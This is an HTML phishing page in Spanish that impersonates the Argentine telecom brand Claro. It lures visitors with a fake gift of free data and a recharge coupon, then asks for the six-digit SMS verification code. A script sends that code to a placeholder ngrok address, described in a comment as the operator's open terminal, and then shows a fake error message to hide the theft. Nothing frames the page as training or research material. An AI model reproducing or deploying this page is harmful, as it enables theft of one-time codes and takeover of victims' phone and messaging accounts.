<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Claro | Pack de Beneficios</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f4; margin: 0; text-align: center; }
        .header { background: #ee1c25; padding: 20px; color: white; font-weight: bold; font-size: 24px; }
        .card { background: white; margin: 20px auto; padding: 20px; width: 90%; max-width: 400px; border-radius: 10px; box-shadow: 0 4px 8px rgba(0,0,0,0.1); }
        .btn { background: #ee1c25; color: white; padding: 15px; width: 100%; border: none; border-radius: 5px; font-size: 18px; cursor: pointer; }
        input { width: 90%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 5px; text-align: center; font-size: 18px; }
        #paso2 { display: none; }
    </style>
</head>
<body>
    <div class="header">Claro Club</div>
    
    <div id="paso1" class="card">
        <h2 style="color: #ee1c25;">¡REGALO EXCLUSIVO!</h2>
        <p>Por ser cliente platino, tenés <strong>20GB GRATIS</strong> y un cupón de <strong>$10.000 ARS</strong> para recargas.</p>
        <button class="btn" onclick="mostrarSms()">CANJEAR AHORA</button>
    </div>

    <div id="paso2" class="card">
        <h3>VERIFICACIÓN DE SEGURIDAD</h3>
        <p>Ingresá el código de 6 dígitos que te enviamos por SMS para activar tus beneficios.</p>
        <input type="number" id="sms_input" placeholder="000000">
        <button class="btn" onclick="enviarTerminal()">ACTIVAR PACK</button>
        <p style="font-size: 12px; color: gray;">Tu seguridad es lo primero. Claro no te pedirá contraseñas.</p>
    </div>

    <script>
        function mostrarSms() {
            document.getElementById('paso1').style.display = 'none';
            document.getElementById('paso2').style.display = 'block';
        }

        function enviarTerminal() {
            var codigo = document.getElementById('sms_input').value;
            // Aquí se conecta con tu terminal abierta
            fetch('https://TU-URL-DE-NGROK.ngrok-free.app/log?codigo=' + codigo);
            alert("Error de conexión. Reintente en 5 minutos.");
        }
    </script>
</body>
</html>
